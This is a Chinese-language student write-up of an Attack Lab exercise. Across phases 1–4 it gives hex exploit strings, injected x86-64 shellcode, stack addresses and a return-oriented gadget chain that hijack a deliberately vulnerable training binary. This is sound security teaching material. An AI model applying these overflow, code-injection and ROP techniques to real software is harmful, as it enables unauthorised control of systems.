# Phase 1

第一阶段是利用缓冲区溢出来使得`getbuf`执行`ret`指令时将控制传递给`touch1`函数。

我们所需要做的就是先确定`getbuf`的缓冲区的大小，然后用无用字符将缓冲区填满。

首先使用`objdump -d` 查找到`getbuf`和`touch1`的地址：

![image-20211205153338699](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842007.png)

对`getbuf()`的分析如下：

```c
//getbuf():
//分配的栈长度为0x28也就是40字节
//40个字节之后的8个字符即为返回地址，也就是我们需要覆盖掉的东西
//因此我们只需要先填满40个字节的缓冲区，然后再在随后的8个字符填入touch1的函数地址即可。
```

- 构造如下字符串，并保存为`touch1Hex.txt`。并利用Hex2Raw转换至`touch1Raw.txt`

```c
//16进制的字符串前40字节为1 - 5的重复八次。
//最后八字节是touch1的地址：00401829
//对应的exploit string：
//懒得写了。。
//下图为touch1Hex.txt的内容以及实验结果
//中途因为忽略了小端放置导致RawText的文件一直不对
```

![image-20211205160754236](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842038.png)

# Phase 2

cookie：0x3b9bd43c

第二部分需要我们注入一小段代码作为exploit string。但是我们需要在调用touch2的同时假装将我的cookie值从键盘输入给它作为参数。

- 所以我们需要在`getbuf`执行`ret`指令时跳转到我们自己写的一小段代码。因此我们需要将我们所写的代码的地址以`phase1`的方式压入`getbuf`的栈中。
- 对于我们所写的代码，它需要完成：
  - 将我们的cookie放入寄存器`%rdi(考虑到cookie是32位的，应该是%edi?)`，这样在调用`touch2`时`touch2`就会以为我们从标准输入给它输入了cookie作为参数
  - 将cookie放入寄存器之后，利用ret指令将控制传递给`touch2`。
  - 要完成上一步，就需要我们查看`touch2`的地址，并把这个地址压入栈中。

查看`touch2`的地址：

![image-20211205164143512](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842081.png)

编写如下功能并保存为`Touch2.S`：

```c
movl $0x3b9bd43c, %rdi # 传递cookie
pushq $0x000000000040185d # 将touch2地址压栈
ret
```

得到指令的字节编码：48 c7 c7 3c d4 9b 3b 68 5d 18 40 00 c3

```c
Touch2.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 3c d4 9b 3b 	mov    $0x3b9bd43c,%rdi
   7:	68 5d 18 40 00       	pushq  $0x40185d
   c:	c3                   	retq   
```

- 因此就是把这一段代码放入缓冲区：
  - 查看缓冲区的起始地址：得到此时的地址为0x556275e8。

![image-20211205195919504](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842120.png)

- 因此最后我们输入的代码由两部分组成：第一部分包含我们注入的代码，第二部分为我们刚才得到的缓冲区地址。

```c
//最后的攻击字符串：
/*
48 c7 c7 3c d4 9b 3b 68
5d 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//以上代码放慢缓冲区，为我们注入的代码
e8 75 62 55 00 00 00 00
//以上为缓冲区的起始地址，使得跳转到我们注入的代码
```

最终结果：

![image-20211205200738114](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842153.png)

# Phase 3

这次相较于第二阶段只是要求我们将指针传入`%rdi`。指针指向的是内存中cookie的字符串形式`3b9bd43c`

首先查看一下`touch3`的地址：`0x401976`

![image-20211205201304984](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842183.png)

man ASCII 找到cookie的字节符表示：`3b9bd43c`：`33 62 39 62 64 34 33 63`。

由于在`touch3`中调用其他函数会覆盖getbuf的缓冲区，所以我们先构造一个字符串进入`touch3`来确定我们的cookie字符串放在哪里不会被覆盖。

```c
/*
00 00 00 00 00 00 00 00
11 45 14 11 45 14 11 45
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//以上覆盖40字节getbuf缓冲区
76 19 40 00 00 00 00 00
//上一行为touch3地址
*/
```

感觉贴近跳转touch3地址的地方可以：$0x55627618 

开始编写汇编代码：

```c
mov $0x55627618 %rdi
pushq $0x401976
ret
```

汇编和反汇编得：48 c7 c7 18 76 62 55 68 76 19 40 00 c3

```c
touch3.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 18 76 62 55 	mov    $0x55627618,%rdi
   7:	68 76 19 40 00       	pushq  $0x401976
   c:	c3                   	retq   
```

最后的字符串：

```c
/*
48 c7 c7 18 76 62 55 68//将寄存器的值设为字符串的地址
76 19 40 00 c3 00 00 00//将touch3的地址压入栈，并ret到touch3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//以上40字节填满缓冲区使之溢出
e8 75 62 55 00 00 00 00
//以上为缓冲区的起始地址，使得跳转到我们注入的代码
33 62 39 62 64 34 33 63
//我的cookie
*/
```

- 我只能说：ko ko SU KI：

![image-20211205210404581](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112060842213.png)

# Phase 4

和Level 2思路一致，我们需要将将寄存器`%rdi`的值设置为`cookie`。
在上面找到的满足条件的`gadget`中可以凑出能够实现攻击的指令。
先将寄存器`%rax`的值设置为`cookie`，然后复制给`%rdi`。

`rtarget`中的touch2

![image-20211206163616361](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112061745422.png)

```c
/*
popq %rax//对应的字节编码，查表可知 58
ret //c3
mov  %rax,%rdi //查表得对应字节编码 48 89 c7
ret   //c3
*/
//所以需要找到：58 c3 起始地址位于0x401a25
//以及 48 89 c7 c3 位于0x401a37
/*所以最后的字符串为*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//以上40字节填满缓冲区使之溢出，最开始还把touch2的栈内存当成getbuf的缓冲区内存大小了。。
25 1a 40 00 00 00 00 00//第一半指令的地址(popq)401a25
3c d4 9b 3b 00 00 00 00//我的cookie
37 1a 40 00 00 00 00 00//第二半指令的地址401a37
5d 18 40 00 00 00 00 00//touch2地址
```

![image-20211206164209664](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112061745443.png)

![image-20211206164409410](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112061745473.png)

- 下面为标注出来的指令位置：

```c
0000000000401a15 <start_farm>:
  401a15:	b8 01 00 00 00       	mov    $0x1,%eax
  401a1a:	c3                   	retq   

0000000000401a1b <setval_481>:
  401a1b:	c7 07 58 c3 b2 8b    	movl   $0x8bb2c358,(%rdi)
  401a21:	c3                   	retq   
/***************************************************************************/
0000000000401a22 <getval_452>:
  401a22:	b8 37 ce /*58 c3  对应指令：popq %rax*/       	mov    $0xc358ce37,%eax
  401a27:	c3                   	retq   

0000000000401a28 <getval_226>:
  401a28:	b8 58 91 90 90       	mov    $0x90909158,%eax
  401a2d:	c3                   	retq   
/****************************************************************/
0000000000401a2e <setval_330>:
  401a2e:	c7 07 /*48 89 c7 c3 对应指令 mov %rax , %rdi*/    	movl   $0xc3c78948,(%rdi)
  401a34:	c3                   	retq   

0000000000401a35 <addval_299>:
  401a35:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401a3b:	c3                   	retq   

0000000000401a3c <setval_358>:
  401a3c:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  401a42:	c3                   	retq   

0000000000401a43 <getval_151>:
  401a43:	b8 48 89 c7 c7       	mov    $0xc7c78948,%eax
  401a48:	c3                   	retq   

0000000000401a49 <addval_489>:
  401a49:	8d 87 0d 58 90 c2    	lea    -0x3d6fa7f3(%rdi),%eax
  401a4f:	c3                   	retq   

0000000000401a50 <mid_farm>:
  401a50:	b8 01 00 00 00       	mov    $0x1,%eax
  401a55:	c3                   	retq   
```

![image-20211206173226319](https://raw.githubusercontent.com/CorneliaStreet1/PictureBed/master/202112061745499.png)

# Phase 5

只占5分。。。狗都不做。

其实是因为DDL太多了啊啊啊啊啊啊啊啊啊啊啊啊啊啊。呜呜呜呜呜呜呜呜呜呜呜呜呜呜。
